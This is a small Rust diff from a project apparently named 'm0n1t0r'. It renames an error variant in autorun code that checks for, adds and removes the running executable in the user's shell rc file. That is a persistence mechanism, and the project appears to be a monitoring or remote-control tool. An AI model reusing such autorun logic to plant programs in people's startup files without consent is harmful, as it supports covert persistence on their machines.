@@ -68,7 +68,7 @@ impl m0n1t0r_common::autorun::Agent for AgentObj {
         self.exist_internal(
             env::current_exe()?.to_path_buf(),
             UserDirs::new()
-                .ok_or(Error::BadUserDirectory)?
+                .ok_or(Error::InvalidUserDirectory)?
                 .home_dir()
                 .join(Shell::new().rc_file()),
         )
@@ -79,7 +79,7 @@ impl m0n1t0r_common::autorun::Agent for AgentObj {
         self.remove_internal(
             env::current_exe()?.to_path_buf(),
             UserDirs::new()
-                .ok_or(Error::BadUserDirectory)?
+                .ok_or(Error::InvalidUserDirectory)?
                 .home_dir()
                 .join(Shell::new().rc_file()),
         )
@@ -90,7 +90,7 @@ impl m0n1t0r_common::autorun::Agent for AgentObj {
         self.add_internal(
             exe,
             UserDirs::new()
-                .ok_or(Error::BadUserDirectory)?
+                .ok_or(Error::InvalidUserDirectory)?
                 .home_dir()
                 .join(Shell::new().rc_file()),
         )
